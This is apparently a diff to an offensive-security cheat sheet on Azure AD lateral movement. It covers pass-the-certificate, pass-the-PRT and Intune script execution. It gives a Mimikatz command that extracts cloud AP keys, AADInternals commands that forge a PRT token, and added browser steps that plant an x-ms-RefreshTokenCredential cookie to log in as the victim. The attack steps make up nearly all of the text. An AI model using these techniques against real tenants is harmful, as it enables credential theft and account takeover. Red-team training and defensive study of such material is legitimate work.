@@ -1,6 +1,7 @@
 # Lateral movement
 ## Pass the certificate
 - To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.
+
 #### Check if machine is Azure AD Joined
 ```
 dsregcmd /status
@@ -29,11 +30,21 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd 
 
 ```
 
+### Pass the PRT
 #### Request access token (cookie) to all applications
 ```
 Import-Module .\AADInternals.psd1
 New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SessionKey -GetNonce
 ```
+
+#### Copy the value from above command and use it with a web browser
+– Open the Browser in Incognito mode
+– Go to https://login.microsoftonline.com/login.srf
+– Press F12 (Chrome dev tools) -> Application -> Cookies
+– Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for https://login.microsoftonline.com and set its value to that retrieved from AADInternals
+– Mark HTTPOnly and Secure for the cookie
+– Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!
+
 
 ## Intune
 - a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
